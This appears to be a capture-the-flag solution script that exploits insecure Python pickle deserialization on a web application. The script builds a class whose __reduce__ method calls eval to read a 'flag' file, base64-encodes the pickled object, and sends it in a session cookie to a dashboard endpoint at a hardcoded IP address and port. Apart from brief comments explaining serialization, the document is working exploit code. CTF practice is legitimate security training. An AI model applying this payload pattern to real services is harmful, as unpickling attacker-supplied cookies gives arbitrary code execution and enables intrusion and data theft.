# At this moment we can send some pickle payloads to the server which will lead to arbitrary file read vulnerability. 
# Serialization and deserialization - the process of converting a Python object into a byte stream in order to store it in a file/database, maintain program state across sessions, or transport data across a network. 

# Unpickling the pickled byte stream allows you to recreate the original object hierarchy

# payload:

import pickle
import base64
import requests

class Exploit(object):
    def __reduce__(self):
        return eval, ("open('flag', 'r').read()", )

def sendPayload(p):
    print(base64.urlsafe_b64encode(p))
    headers = {"Cookie": "data=" + base64.urlsafe_b64encode(p).decode()}
    t = requests.get("http://34.107.45.207:32022/dashboard", headers=headers)
    print(t.text)

sendPayload(pickle.dumps(Exploit(), protocol=2))
